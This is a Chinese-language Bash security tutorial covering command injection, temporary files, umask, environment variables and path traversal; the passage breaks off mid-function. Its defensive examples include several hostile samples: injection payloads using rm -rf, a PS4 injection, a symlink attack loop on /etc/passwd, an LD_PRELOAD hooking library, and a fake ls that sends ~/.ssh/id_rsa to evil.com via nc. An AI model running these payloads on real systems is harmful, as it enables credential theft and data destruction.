
# 1. 命令注入防御

命令注入是 Shell 脚本中最致命的安全漏洞之一。攻击者通过构造特殊输入，使得脚本意外执行额外的系统命令。防御的核心原则是：**永远不要信任外部输入，永远不要将未经处理的数据拼接到命令字符串中**。

## 1.1 eval 的危害与内部机制

`eval` 让 Bash 对参数进行两轮解析：第一次展开变量，第二次将展开后的内容作为 Shell 语法重新解释执行。这意味着输入中的 `` ` ``、`$()`、`;`、`|`、`&&` 等元字符会获得执行机会。

**攻击原理：** 当用户输入 `"; rm -rf /; "` 时，`eval "echo $input"` 被展开为 `eval "echo ""; rm -rf /; """`，三个命令依次执行，中间那条就是攻击载荷。

```bash
#!/bin/bash
# === 危险示例：eval 使用用户输入 ===
read -rp "请输入查询字符串: " query
eval "grep '$query' /var/log/app.log"    # 极度危险！
# 攻击输入: '; rm -rf /home/user; '

# === 安全替代方案 ===
read -rp "请输入查询字符串: " query
grep "$query" /var/log/app.log            # 直接作为参数传递，无需 eval

# 如果必须动态构造命令，使用数组
read -rp "请输入查询字符串: " query
read -rp "请输入文件名: " filename
args=()
args+=("grep")
args+=("$query")
args+=("$filename")
"${args[@]}"                              # 数组执行不会进行二次解析
```

**内建命令替代 eval 的场景：**

| 需求 | 危险做法 | 安全替代 |
|------|---------|---------|
| 间接变量引用 | `eval echo \$$varname` | `${!varname}` (Bash 4.0+) |
| 动态命令执行 | `eval "$cmd"` | 函数封装或数组 |
| 算术运算 | `eval "echo \$(( $expr ))"` | `$(( expr ))` 直接运算 |
| 字符串转义 | `eval "echo \"$str\""` | `printf '%s\n' "$str"` |
| 导出函数 | `eval "$(declare -f func)"` | `export -f func` |

## 1.2 命令注入的完整攻击面

Shell 解析的每一个阶段都可能产生注入点：

```bash
#!/bin/bash
# 注入点 1: 命令替换
file="$(curl -s "$user_url")"          # $user_url 若为 ";id;" 可执行

# 注入点 2: 管道
echo "$input" | sh                     # 直接传数据给 Shell 解释器

# 注入点 3: 反引号（旧式命令替换）
result=`echo "$input"`                 # 反引号内部仍会被解析

# 注入点 4: source / .
. "$user_file"                         # 加载用户指定文件 = 任意代码执行
source "$user_file"

# 注入点 5: xargs
echo "$filenames" | xargs rm -f        # 文件名含换行 → 文件被误删除

# 注入点 6: find -exec
find "$user_dir" -name "*.log" -exec sh -c "$cmd" \;  # $cmd 可被注入

# 注入点 7: awk 的 system()
awk -v u="$input" 'BEGIN { system("echo " u) }'  # awk 内调 system 危险

# 注入点 8: trap 字符串
trap "$user_code" EXIT                 # trap 接收字符串，被 eval 类似
```

## 1.3 输入验证白名单策略

白名单是比黑名单更有效的防御手段。与其试图过滤所有危险字符，不如明确允许哪些字符。

```bash
#!/bin/bash
# ── 白名单验证函数 ──
validate_alphanumeric() {
    local input="$1" label="${2:-value}"
    # 只允许字母、数字、下划线、连字符、点
    if [[ ! "$input" =~ ^[a-zA-Z0-9._-]+$ ]]; then
        printf '[错误] %s 包含非法字符，只允许 [a-zA-Z0-9._-]\n' "$label" >&2
        printf '非法值: %s\n' "$input" >&2
        return 1
    fi
    return 0
}

validate_filename() {
    local input="$1"
    # 文件名：禁止空，禁止 . 开头（隐藏文件），禁止 / 出现
    if [[ -z "$input" ]]; then
        echo "文件名不能为空" >&2; return 1
    fi
    if [[ "$input" =~ ^\. ]]; then
        echo "文件名不允许以 . 开头" >&2; return 1
    fi
    if [[ "$input" =~ / ]]; then
        echo "文件名不允许包含路径分隔符" >&2; return 1
    fi
    # 允许常见安全字符
    if [[ ! "$input" =~ ^[a-zA-Z0-9._-]+$ ]]; then
        echo "文件名包含非法字符" >&2; return 1
    fi
    return 0
}

validate_ipv4() {
    local ip="$1"
    # 严格的 IPv4 白名单校验（包含范围检查 0-255）
    local octet='(25[0-5]|2[0-4][0-9]|1[0-9]{2}|[1-9]?[0-9])'
    if [[ "$ip" =~ ^${octet}\.${octet}\.${octet}\.${octet}$ ]]; then
        return 0
    fi
    echo "非法 IPv4 地址: $ip" >&2
    return 1
}

# ── 使用示例 ──
read -rp "输入用户名: " username
if validate_alphanumeric "$username" "用户名"; then
    echo "用户名有效: $username"
fi
```

## 1.4 参数化调用与引号规则

正确的引号使用可以阻止大部分注入，因为引号内的元字符失去特殊含义：

```bash
#!/bin/bash
# ── 引号防护原则 ──
# 永远双引号保护变量展开 "$var"、"$@"、"${arr[@]}"
# 单引号内的所有字符都是字面量
# 引号的防护边界：变量展开后不会重新进行代码解析

user_input='$(whoami) `id` ; ls /etc/passwd'

# 安全：变量值被当作普通字符串传给 grep
echo "$user_input"          # 输出字面量: $(whoami) `id` ; ls /etc/passwd
grep "$user_input" file     # 作为搜索模式，不会被解释为命令

# 危险：没有引号时，$user_input 被展开后再进行单词分割和通配符展开
# echo $user_input          # 会产生多个单词，但不会执行命令替换（echo 不解析）

# 真正危险的对比
dangerous='$(id)'
eval echo "$dangerous"      # eval 再次解析 → 执行 id 命令
sh -c "echo $dangerous"     # sh -c 再次解析 → 执行 id 命令
```

**参数化调用的实现模式：**

```bash
#!/bin/bash
# ── 方式一: 使用函数替代动态命令字符串 ──
# 危险模式
cmd_str="grep $pattern $file"
eval "$cmd_str"

# 安全模式：定义函数
do_grep() {
    local pattern="$1" file="$2"
    grep "$pattern" "$file"
}
do_grep "$pattern" "$file"

# ── 方式二: 使用数组构建命令 ──
cmd_args=(grep "$pattern" "$file")
"${cmd_args[@]}"

# ── 方式三: SSH 远程执行的安全传参 ──
# 危险
ssh host "grep '$pattern' /var/log/*"   # $pattern 可注入

# 安全：使用 printf %q 转义
printf -v escaped '%q' "$pattern"
ssh host "grep $escaped /var/log/*"
```

# 2. 临时文件安全

临时文件是攻击者利用竞态条件、符号链接攻击和权限泄露的常见目标。不安全的临时文件使用可能导致文件覆盖、信息泄露甚至权限提升。

## 2.1 固定文件名带来的风险

使用可预测的临时文件名是经典的 TOCTOU（Time of Check, Time of Use）安全漏洞。

**攻击场景：符号链接攻击（Symlink Attack）**

```bash
#!/bin/bash
# === 危险模式：固定临时文件名 ===
tmp=/tmp/myapp_work_$$                  # $$ 是可预测的 PID
echo "processing..." > "$tmp"
# ... 处理数据 ...
cat "$tmp" | process_data
rm "$tmp"

# 攻击者预先执行：
# while true; do ln -sf /etc/passwd /tmp/myapp_work_12345; done
# 如果攻击者猜中 PID=12345，脚本将覆盖 /etc/passwd！

# === 安全模式：使用 mktemp ===
# mktemp 原子性地创建一个唯一文件，不存在 TOCTOU 窗口
tmpfile="$(mktemp)"                     # /tmp/tmp.XXXXXXXXXX
# 或指定模板
tmpfile="$(mktemp /tmp/myapp.XXXXXX)"   # /tmp/myapp.SDf8k3

# mktemp 默认创建文件，使用 -d 创建目录
tmpdir="$(mktemp -d)"
echo "Working in: $tmpdir"

# mktemp 的安全保证：
# 1. 原子操作：检查和创建是一步完成的（O_CREAT|O_EXCL）
# 2. 默认权限 0600（仅所有者可读写）
# 3. 随机后缀：6 个 X 提供 62^6 ≈ 568 亿种组合
```

**mktemp 的高级用法：**

```bash
#!/bin/bash
# ── 创建临时目录（推荐，可容纳多个临时文件） ──
tmpdir="$(mktemp -d)" || {
    echo "无法创建临时目录" >&2; exit 1
}

# 在目录内自由创建文件，无命名冲突
input_file="$tmpdir/input.txt"
output_file="$tmpdir/output.json"
log_file="$tmpdir/process.log"

echo "data" > "$input_file"
process_data "$input_file" > "$output_file" 2> "$log_file"

# ── 指定安全的基础目录 ──
# 使用 TMPDIR 或自定义安全目录
safe_base="${TMPDIR:-/tmp}"
# 确保基础目录不在全局可写位置
if [[ ! -d "$safe_base" ]]; then
    safe_base=/tmp
fi
tmpfile="$(mktemp "${safe_base}/myscript.XXXXXX")"

# ── 使用 -t 选项（兼容 POSIX，但不是所有系统都支持） ──
# mkstemp 类似物
exec 3<> >(true)  # 不等于 mktemp，这里仅作说明
```

## 2.2 trap 机制确保临时文件清理

无论脚本正常退出还是被信号中断，都应该清理临时文件。`trap` 是实现这一目标的标准手段。

**核心原理：** `trap` 注册的信号处理器在脚本退出（含 `exit`、信号、`set -e` 触发退出）时被执行。函数内 `trap` 在函数返回时也会触发（如果信号在函数执行期间收到）。

```bash
#!/bin/bash
# ── 完整的临时文件生命周期管理 ──
set -euo pipefail

cleanup() {
    local exit_code=$?
    echo "清理临时文件..."

    # 删除单个文件
    if [[ -n "${tmpfile:-}" ]] && [[ -f "$tmpfile" ]]; then
        rm -f "$tmpfile"
    fi

    # 删除整个临时目录
    if [[ -n "${tmpdir:-}" ]] && [[ -d "$tmpdir" ]]; then
        rm -rf "$tmpdir"
    fi

    # 删除文件描述符（若打开）
    if [[ -n "${lock_fd:-}" ]]; then
        exec {lock_fd}>&-
    fi

    echo "退出码: $exit_code"
    exit "$exit_code"
}

# 注册清理函数（覆盖多种退出场景）
trap cleanup EXIT    # 正常退出
trap cleanup INT     # Ctrl+C 中断
trap cleanup TERM    # kill 发送的终止信号
# 注意：EXIT trap 已覆盖正常退出和错误退出
# INT/TERM 显式注册可确保特定信号的即时响应

# ── 创建临时目录并开始工作 ──
tmpdir="$(mktemp -d)"
echo "临时目录: $tmpdir"

# 业务逻辑
do_work "$tmpdir"

echo "处理完成"
# 退出时自动清理，无需显式调用 cleanup
```

**信号覆盖矩阵：**

| 场景 | 触发 trap |
|------|----------|
| `exit 0` | EXIT |
| `exit 1` | EXIT |
| `set -e` 触发退出 | EXIT |
| Ctrl+C (SIGINT) | INT → EXIT |
| `kill $pid` (SIGTERM) | TERM → EXIT |
| `kill -9 $pid` (SIGKILL) | **无法捕获** |
| 脚本最后一行执行完毕 | EXIT |
| 函数内收到信号 | 信号 trap → 函数返回 → 若在脚本顶层则 EXIT |

**KILL 信号的不可捕获性：** `SIGKILL` 被内核直接终止进程，不经过任何用户态处理，因此 trap 对其无效。对于关键临时文件，应考虑在启动时清理残留。

```bash
#!/bin/bash
# ── 遗留临时文件清理（防御 SIGKILL 残留） ──
script_name="$(basename "$0")"
tmp_pattern="/tmp/${script_name}.*"

# 启动时清理上次可能遗留的旧临时文件（30 分钟前的）
find "$(dirname "$tmp_pattern")" \
    -maxdepth 1 \
    -name "$(basename "$tmp_pattern")" \
    -type f \
    -mmin +30 \
    -exec rm -f {} \; 2>/dev/null || true
```

## 2.3 TMPDIR 与安全目录选择

并非所有系统的 `/tmp` 都安全。一些环境中 `/tmp` 是全局可写的 `world-writable`，可能被挂载为 `noexec`、`nosuid`，或者空间不足。

```bash
#!/bin/bash
# ── TMPDIR 安全选择策略 ──

select_tmp_dir() {
    local candidates=(
        "${TMPDIR:-}"                    # 1. 用户自定义
        "${XDG_RUNTIME_DIR:-}"           # 2. systemd 用户运行时目录（非持久、私有）
        "$HOME/tmp"                      # 3. 用户家目录下的临时目录
        "/var/tmp"                       # 4. 系统级持久临时目录
        "/tmp"                           # 5. 最后选择
    )

    for dir in "${candidates[@]}"; do
        if [[ -z "$dir" ]]; then continue; fi
        if [[ ! -d "$dir" ]]; then continue; fi
        if [[ ! -w "$dir" ]]; then continue; fi

        # 检查目录是否安全：非全局可写，或设置了 sticky bit
        local perms
        perms="$(stat -c '%a' "$dir" 2>/dev/null || stat -f '%Mp%Lp' "$dir" 2>/dev/null)"

        # /tmp 的标准权限是 1777（sticky + 全可读写但仅所有者可删除）
        # 如果有 sticky bit (1000)，相对安全
        echo "$dir"
        return 0
    done

    echo "/tmp"  # 最终回退
    return 1
}

TMPDIR="$(select_tmp_dir)"
export TMPDIR
echo "使用临时目录: $TMPDIR"

# ── 检查临时目录权限 ──
check_tmp_security() {
    local dir="$1"

    # 检查是否是符号链接（可能指向危险位置）
    if [[ -L "$dir" ]]; then
        echo "[警告] $dir 是符号链接，解析目标为: $(readlink -f "$dir")" >&2
    fi

    # 检查是否有 sticky bit
    local sticky
    sticky="$(stat -c '%a' "$dir" 2>/dev/null | head -c1)"
    if [[ "$sticky" != "1" ]]; then
        echo "[警告] $dir 没有设置 sticky bit，可能存在文件劫持风险" >&2
        echo "[建议] 使用 HOME 下的目录: $HOME/tmp" >&2
    fi
}
check_tmp_security "$TMPDIR"
```

# 3. umask 与权限控制

`umask`（用户文件创建掩码）决定了进程创建文件时的默认权限。正确配置 umask 可以防止敏感文件被其他用户读取或修改。

## 3.1 umask 工作原理

**原理：** 创建文件的系统调用 `open(path, O_CREAT, mode)` 中指定的 `mode` 会与 `~umask` 做按位与运算，得到最终权限。文件通常的创建 mode 是 `0666`（可读写），目录是 `0777`（全权限）。

```
创建文件：mode & ~umask = 最终权限
0666 & ~0022 = 0666 & 0755 = 0644  (rw-r--r--)
0666 & ~0077 = 0666 & 0700 = 0600  (rw-------)
```

```bash
#!/bin/bash
# ── umask 基础用法 ──

# 查看当前 umask（八进制表示）
umask                # 例如输出 0022
umask -S             # 符号表示：u=rwx,g=rx,o=rx

# 设置严格 umask（默认创建的文件仅所有者可读）
umask 0077           # 文件 0600, 目录 0700
touch new_file.txt
ls -la new_file.txt  # -rw------- 1 user group 0 ...

# 设置标准 umask
umask 0022           # 文件 0644, 目录 0755

# ── 脚本内部设置 umask ──
#!/bin/bash
# 在脚本开头设置
umask 0077   # 所有临时文件、输出文件仅当前用户可访问

# 对于需要共享的文件，显式设置权限
chmod 644 shared_output.txt

# ── 子 shell 的 umask 继承（命令替换中） ──
umask 0022
file_perm=$(umask 0077; touch subfile; stat -c '%a' subfile; rm -f subfile)
echo "子 shell 中创建的文件权限: $file_perm"  # 600
umask  # 仍然是 0022（子 shell 的 umask 不影响父 shell）
```

## 3.2 敏感文件的权限检查与加固

```bash
#!/bin/bash
# ── 权限审计函数 ──
audit_sensitive_files() {
    local issues=0

    # SSH 私钥 → 必须是 0600
    for key in "$HOME/.ssh/id_rsa" "$HOME/.ssh/id_ed25519"; do
        if [[ -f "$key" ]]; then
            local perms
            perms="$(stat -c '%a' "$key" 2>/dev/null)"
            if [[ "$perms" != "600" ]]; then
                echo "[失败] $key 权限为 $perms（应为 600）"
                ((issues++))
                chmod 600 "$key" && echo "[修复] 已将 $key 权限设为 600"
            fi
        fi
    done

    # ~/.ssh 目录 → 必须是 0700
    if [[ -d "$HOME/.ssh" ]]; then
        local sshdir_perms
        sshdir_perms="$(stat -c '%a' "$HOME/.ssh")"
        if [[ "$sshdir_perms" != "700" ]]; then
            echo "[失败] ~/.ssh 目录权限为 $sshdir_perms（应为 700）"
            ((issues++))
            chmod 700 "$HOME/.ssh" && echo "[修复] 已将 ~/.ssh/ 权限设为 700"
        fi
    fi

    # 配置文件（含密码/密钥的）→ 至少 0600
    local sensitive_configs=(
        "$HOME/.aws/credentials"
        "$HOME/.docker/config.json"
        "$HOME/.netrc"
        "$HOME/.pgpass"
    )
    for cfg in "${sensitive_configs[@]}"; do
        if [[ -f "$cfg" ]]; then
            local cperm
            cperm="$(stat -c '%a' "$cfg")"
            if (( cperm > 600 )); then
                echo "[警告] $cfg 权限为 $cperm，组和其他用户可读" >&2
                ((issues++))
            fi
        fi
    done

    return "$issues"
}
audit_sensitive_files

# ── 创建文件时的安全模式 ──
create_secure_file() {
    local filepath="$1" content="$2"

    # 方法一：umask + 重定向
    (
        umask 0077
        printf '%s\n' "$content" > "$filepath"
    )

    # 方法二：mktemp + chmod
    local tmp
    tmp="$(mktemp)"
    printf '%s\n' "$content" > "$tmp"
    chmod 600 "$tmp"
    mv "$tmp" "$filepath"
}

# ── 检查 world-writable 文件 ──
find_world_writable() {
    local dir="${1:-$HOME}"
    echo "查找 $dir 下全局可写的文件..."
    find "$dir" -type f -perm -o+w ! -type l -ls 2>/dev/null || true
}
```

**umask 的最佳实践对照表：**

| 场景 | 推荐 umask | 文件权限 | 目录权限 |
|------|-----------|---------|---------|
| 系统守护进程 | 0022 | 0644 | 0755 |
| 敏感数据处理脚本 | 0077 | 0600 | 0700 |
| 多人协作项目 | 0007 | 0660 | 0770 |
| CI/CD 与容器构建 | 0022 | 0644 | 0755 |
| Web 应用脚本 | 0027 | 0640 | 0750 |

# 4. 环境变量安全

环境变量是 Shell 进程间通信的核心机制，也是攻击者注入恶意代码的高危通道。Bash 在启动时会继承父进程的全部环境变量，其中大量变量能改变脚本的执行行为。

## 4.1 Shell 启动时加载的危险变量

Bash 从环境继承并特殊处理以下变量（非 POSIX 要求的标准行为）：

```bash
#!/bin/bash
# ── 危险环境变量清单 ──
# 这些变量要么改变 Shell 行为，要么引入代码执行路径

declare -a dangerous_env_vars=(
    # 命令执行类
    "BASH_ENV"        # 非交互 Bash 启动时执行的文件（类似 .bashrc）
    "ENV"             # POSIX sh 的启动文件
    "SHELLOPTS"       # 自动设置 set 选项（如 SHELLOPTS=xtrace）
    "BASHOPTS"        # Bash shopt 选项

    # 代码注入类
    "BASH_FUNC_"      # 函数导出前缀（Bash 4.4 前的 ShellShock 相关）
    "PROMPT_COMMAND"  # 每个主提示符前执行的命令

    # 动态链接类
    "LD_PRELOAD"      # 加载指定 .so 文件到所有子进程
    "LD_LIBRARY_PATH" # 共享库搜索路径（suid 程序除外）

    # 路径类
    "PATH"            # 命令搜索路径（常被投毒）
    "CDPATH"          # cd 的搜索路径

    # 区域与字符处理类
    "IFS"             # 内部字段分隔符（可改变单词分割行为）
    "LC_ALL"          # 覆盖所有 locale 设置（影响 glob 排序）
    "LANG"
    "LC_COLLATE"      # 字符串排序规则（可改变 [a-z] 范围）
    "LC_NUMERIC"      # 数字表示格式

    # 调试与追踪类
    "PS4"             # set -x 的输出前缀（可包含命令替换！）
    "BASH_XTRACEFD"   # xtrace 输出文件描述符

    # 扩展相关
    "GLOBIGNORE"      # 改变通配符行为
    "FIGNORE"         # 文件名补全忽略模式
    "HISTFILE"        # 历史文件（可指向敏感位置导致泄露）
    "INPUTRC"         # readline 初始化文件
)

# PS4 命令注入演示
# PS4='$(id > /tmp/owned)' ./vulnerable_script.sh
# set -x 的脚本会静默执行 id > /tmp/owned
```

## 4.2 环境变量白名单清理策略

在脚本启动时，应该只保留业务所需的最小环境变量集合，主动清理或重置危险的变量。

```bash
#!/bin/bash
# ── 环境变量安全初始化 ──
secure_environment() {
    # ── 第一步：白名单（只保留安全变量） ──
    local keep_vars=(
        HOME USER LOGNAME SHELL TERM LANG LC_ALL
        TMPDIR XDG_RUNTIME_DIR DISPLAY
        SSH_AUTH_SOCK SSH_CLIENT SSH_CONNECTION SSH_TTY
        PWD OLDPWD SHLVL
        # 添加你的业务变量：
        # MYAPP_CONFIG MYAPP_DATA_DIR
    )

    # 获取当前所有环境变量名，未在白名单中的卸载
    while IFS='=' read -r -d '' var_name _; do
        local keep=false
        for k in "${keep_vars[@]}"; do
            if [[ "$var_name" == "$k" ]]; then
                keep=true; break
            fi
        done
        if ! $keep; then
            unset "$var_name" 2>/dev/null || true
        fi
    done < <(env -0)

    # ── 第二步：重置危险变量为安全默认值 ──
    unset BASH_ENV ENV PROMPT_COMMAND
    unset LD_PRELOAD LD_LIBRARY_PATH
    unset CDPATH GLOBIGNORE INPUTRC HISTFILE

    # ── 第三步：重置 IFS 为默认 ──
    IFS=$' \t\n'

    # ── 第四步：设置安全的 PS4（防止 xtrace 注入） ──
    PS4='+${BASH_SOURCE:-}:${LINENO:-}:${FUNCNAME[0]:+${FUNCNAME[0]}(): }'

    # ── 第五步：取消所有函数导出（阻止 BASH_FUNC_ 注入） ──
    if command -v env >/dev/null 2>&1; then
        # 删除所有 BASH_FUNC_* 开头的环境变量
        while IFS='=' read -r var_name _; do
            if [[ "$var_name" == BASH_FUNC_* ]]; then
                unset -f "${var_name#BASH_FUNC_%%=*}" 2>/dev/null || true
            fi
        done < <(env | grep '^BASH_FUNC_')
        unset "${!BASH_FUNC_@}" 2>/dev/null || true
    fi
}

# 在脚本入口调用
secure_environment
```

## 4.3 PATH 注入攻击与防御

PATH 注入是最常见且最有效的环境变量攻击之一。攻击者将恶意目录置于 PATH 最前面，使得常用命令被劫持。

**攻击原理：**

```bash
#!/bin/bash
# 攻击者创建恶意目录并在其中放置"假"命令
mkdir -p /tmp/evil
cat > /tmp/evil/ls << 'MALICIOUS'
#!/bin/bash
echo "从 ~/.ssh 偷取密钥..."
cat ~/.ssh/id_rsa | nc evil.com 1337
command ls "$@"    # 执行真正的 ls 避免怀疑
MALICIOUS
chmod +x /tmp/evil/ls

# 攻击者诱骗目标执行：
PATH=/tmp/evil:$PATH ./target_script.sh
# 目标脚本中的 ls 被劫持！
```

**防御策略 — 绝对路径 + 安全 PATH：**

```bash
#!/bin/bash
# ── PATH 安全方案 ──

# 方案一：在脚本启动时强制设置安全的 PATH
readonly SECURE_PATH="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"
export PATH="$SECURE_PATH"
# 声明 readonly 防止后续被意外修改

# 方案二：所有外部命令使用绝对路径
# 优点：完全不受 PATH 影响
# 缺点：可移植性下降
DATE=$(/usr/bin/date '+%s')
HOST=$(/usr/bin/hostname 2>/dev/null || /bin/hostname)

# 方案三：使用 type/command 检查命令的完整性
verify_command() {
    local cmd="$1" expected_path="$2"
    local actual_path
    actual_path="$(type -P "$cmd" 2>/dev/null)"
    if [[ "$actual_path" != "$expected_path" ]]; then
        echo "[安全警告] $cmd 被劫持！" >&2
        echo "  预期: $expected_path" >&2
        echo "  实际: $actual_path" >&2
        return 1
    fi
    return 0
}
verify_command "grep" "/bin/grep" || exit 1
verify_command "curl" "/usr/bin/curl" || exit 1

# 方案四：检测 PATH 中的可疑目录
check_path_safety() {
    local unsafe_dirs=()
    local IFS=':'
    for dir in $PATH; do
        # 检测相对路径（含空字符串，代表当前目录）
        if [[ -z "$dir" ]]; then
            unsafe_dirs+=("(空/当前目录)")
            continue
        fi
        if [[ "$dir" != /* ]]; then
            unsafe_dirs+=("$dir (非绝对路径)")
            continue
        fi
        # 检测全局可写目录
        if [[ -d "$dir" ]] && [[ -w "$dir" ]] && stat -c '%a' "$dir" | grep -q '^.7'; then
            unsafe_dirs+=("$dir (全局可写)")
        fi
    done

    if ((${#unsafe_dirs[@]} > 0)); then
        echo "[安全警告] PATH 中发现以下不安全目录：" >&2
        printf '  - %s\n' "${unsafe_dirs[@]}" >&2
        return 1
    fi
    return 0
}
check_path_safety || exit 1
```

## 4.4 IFS 注入攻击

**IFS（Internal Field Separator）** 决定了 Bash 如何进行单词分割。默认 `IFS=$' \t\n'`（空格、制表符、换行）。如果 IFS 被篡改，变量的展开行为将完全不同。

```bash
#!/bin/bash
# ── IFS 注入演示 ──

# 正常情况
IFS=$' \t\n'
cmd="ls -la /tmp"
$cmd    # 执行 "ls" "-la" "/tmp"

# 攻击场景：IFS 被设为 /
export IFS='/'
cmd="bin/ls"
$cmd    # 被分割为 "bin" "ls" —— 执行了 bin 目录下的某个文件？

# 更危险的攻击
export IFS=':'
read -rp "输入数据: " data
# 用户输入 "a:rm -rf /:b" 且脚本将 data 传给危险函数时
# IFS=':' 使得分割产生意外结果

# ── 防御：在脚本开头锁定 IFS ──
IFS=$' \t\n'  # 显式恢复为默认值
# 并发问题：在函数内也应显式设置

# 命名管道中的 IFS 攻击
# mkfifo /tmp/evil
# 通过在 FIFO 中投递含特殊分隔符的数据改变解析

# 安全访问数组不受 IFS 影响
arr=("hello world" "foo bar")
printf '%s\n' "${arr[@]}"   # 正确：双引号数组不受 IFS 影响
printf '%s\n' ${arr[@]}     # 危险：无引号时 IFS 影响分割
```

## 4.5 LD_PRELOAD 共享库劫持

`LD_PRELOAD` 迫使动态链接器在加载程序前预先加载指定的共享库（`.so`），用于覆盖标准 C 库函数。这是最强大的用户态注入手段之一。

```bash
#!/bin/bash
# ── LD_PRELOAD 攻击原理 ──

# 攻击者编写恶意共享库 (hijack.c)：
cat > /tmp/hijack.c << 'EOF'
#define _GNU_SOURCE
#include <stdio.h>
#include <dlfcn.h>
#include <unistd.h>

// 劫持 fopen
FILE* fopen(const char* path, const char* mode) {
    fprintf(stderr, "[劫持] fopen(%s, %s)\n", path, mode);
    // 偷取敏感文件内容
    FILE* (*real_fopen)(const char*, const char*) = dlsym(RTLD_NEXT, "fopen");
    return real_fopen(path, mode);
}
EOF
# gcc -shared -fPIC hijack.c -o hijack.so -ldl

# 攻击执行
# LD_PRELOAD=/tmp/hijack.so ./target_script.sh
# 目标脚本中所有子进程的系统调用都可能被劫持

# ── 防御措施 ──
# 1. 脚本启动时清除危险变量
unset LD_PRELOAD LD_LIBRARY_PATH

# 2. 对关键子进程显式清理环境后再执行
env -i PATH="$SECURE_PATH" /usr/bin/my_critical_tool

# 3. 检测是否已被注入
check_ld_preload() {
    if [[ -n "${LD_PRELOAD:-}" ]]; then
        echo "[安全警告] LD_PRELOAD 被设置: $LD_PRELOAD" >&2
        echo "[安全警告] 可能存在共享库劫持！" >&2
        return 1
    fi
    if [[ -n "${LD_LIBRARY_PATH:-}" ]]; then
        echo "[安全警告] LD_LIBRARY_PATH: $LD_LIBRARY_PATH" >&2
        return 1
    fi
    return 0
}
check_ld_preload || exit 1

# 4. 子进程执行时使用干净环境
run_secure() {
    local cmd="$1"; shift
    # env -i 清空所有环境变量，只传递显式指定的
    env -i \
        PATH="/usr/bin:/bin:/usr/sbin:/sbin" \
        HOME="$HOME" \
        USER="$USER" \
        "$cmd" "$@"
}
```

# 5. 路径遍历防御

路径遍历（Path Traversal）攻击利用 `../` 序列突破预期的目录边界，访问或修改系统其他位置的文件。典型的攻击输入如 `../../../etc/passwd`、`....//....//etc/passwd`（双写绕过）、URL 编码变体等。

## 5.1 路径规范化的各种手段

```bash
#!/bin/bash
# ── 路径规范化的多层级方案 ──

# 方案一：realpath（最推荐，解析所有符号链接和 ../）
input_path="/var/log/../../etc/passwd"
resolved="$(realpath -m "$input_path" 2>/dev/null)"
echo "$resolved"  # /etc/passwd
# -m 选项：不要求路径存在，仍进行规范化
# 无 -m：要求路径或父目录存在，安全但限制多

# 方案二：readlink -f（类似 realpath，但 POSIX 不要求存在）
resolved="$(readlink -f "$input_path" 2>/dev/null)"

# 方案三：纯 Bash 实现的路径规范化
canonicalize_path() {
    local path="$1"
    # 移除重复的 /
    path="${path//\/\///}"
    # 处理 .. 和 .
    local old_IFS="$IFS"
    IFS='/'
    local -a parts=()
    for part in $path; do
        if [[ "$part" == '.' ]] || [[ -z "$part" ]]; then
            continue
        elif [[ "$part" == '..' ]]; then
            if ((${#parts[@]} > 0)) && [[ "${parts[-1]}" != '..' ]]; then
                unset 'parts[-1]'
            else
                parts+=("$part")
            fi
        else
            parts+=("$part")
        fi
    done
    IFS="$old_IFS"

    local result="/${parts[*]}"
    result="${result// //}"
    printf '%s\n' "$result"
}

# 测试
canonicalize_path "/etc/../etc/./passwd"                # /etc/passwd
canonicalize_path "/var/www/../../../etc/shadow"        # /etc/shadow
```

## 5.2 白名单目录限制

最严格的防御策略是：将文件操作限制在预先声明的、经过规范化的白名单目录内。

```bash
#!/bin/bash
# ── 白名单目录封装 ──

# 定义允许访问的目录列表（必须绝对路径）
ALLOWED_DIRS=(
    "/var/www/html/uploads"
    "/var/www/html/images"
    "/tmp/safe_workdir"
)

# 检查路径是否在白名单目录之内
is_path_allowed() {
    local raw_path="$1"
    local canonical

    # 1. 规范化输入路径
    canonical="$(realpath -m "$raw_path" 2>/dev/null)" || return 1

    # 2. 检查是否在白名单目录之内
    for dir in "${ALLOWED_DIRS[@]}"; do
        local canonical_dir
        canonical_dir="$(realpath -m "$dir" 2>/dev/null)" || continue

        # 要求：canonical 以 canonical_dir/ 开头，或与 canonical_dir 完全匹配
        if [[ "$canonical" == "$canonical_dir" ]] || \
           [[ "$canonical" == "$canonical_dir"/* ]]; then
            # 3. 额外检查：确认路径中不包含符号链接逃逸
            # realpath 已处理，但我们可以双重验证
            if [[ "$canonical" != *'..'* ]]; then
                return 0
            fi
        fi
    done

    echo "[安全拒绝] 路径超出允许范围: $raw_path -> $canonical" >&2
    return 1
}

# ── 使用封装好的安全文件操作函数 ──
safe_read_file() {
    local user_file="$1"
    local resolved
    resolved="/var/www/html/uploads/$(basename "$user_file")"

    if ! is_path_allowed "$resolved"; then
        echo "访问被拒绝" >&2
        return 1
    fi

    cat "$resolved"
}

safe_write_file() {
    local user_file="$1" content="$2"
    local resolved
    resolved="/var/www/html/uploads/$(basename "$user_file")"

    if ! is_path_allowed "$resolved"; then
        echo "写入被拒绝" >&2
        return 1
    fi

    printf '%s\n' "$content" > "$resolved"
}
```

## 5.3 编码绕过与多层级防御

攻击者会尝试用多种编码方式绕过简单的 `../` 过滤：

```bash
#!/bin/bash
# ── 路径遍历的编码绕过检测 ──

detect_path_traversal() {
    local input="$1"

    # 1. URL 解码 (%2e%2e%2f = ../, %2e%2e = ..)
    # bash 原生不处理 URL 编码，但如果脚本自己做了 URL 解码，
    # 攻击者可以输入 %2e%2e%2f 绕过原始的 ../ 过滤

    # 2. 双写绕过 (....// 过滤掉中间的 ../ 后剩余 ../)
    local cleaned="${input//\.\.\//}"
    if [[ "$cleaned" != "$input" ]]; then
        # 这不是可靠的防御，因为可以嵌套
        echo "[警告] 输入包含 ../ 序列（已尝试清理）" >&2
    fi

    # 3. Unicode 等效字符（在某些环境下）
    # \u2025 (‥) 在很多字体中看起来像 ..
    # \u215 (∕) 看起来像 /
    # Shell 环境下这些字符不会被解释为路径分隔符，但应记录

    # 4. 规范化后再次检查（最可靠的方案）
    local canonical
    canonical="$(realpath -m "/safe/root/$input" 2>/dev/null)"
    if [[ "$canonical" != /safe/root/* ]]; then
        echo "[安全警告] 路径遍历攻击检测: $input -> $canonical" >&2
        return 1
    fi
    return 0
}

# ── 完整的多层防御示例 ──
secure_file_operation() {
    local user_filename="$1"
    local safe_base="/var/app/data"

    # 第1层：输入格式验证
    if [[ -z "$user_filename" ]]; then
        echo "错误: 文件名为空" >&2; return 1
    fi
    if [[ "$user_filename" =~ [/\\] ]]; then
        echo "错误: 文件名不允许包含路径分隔符" >&2; return 1
    fi
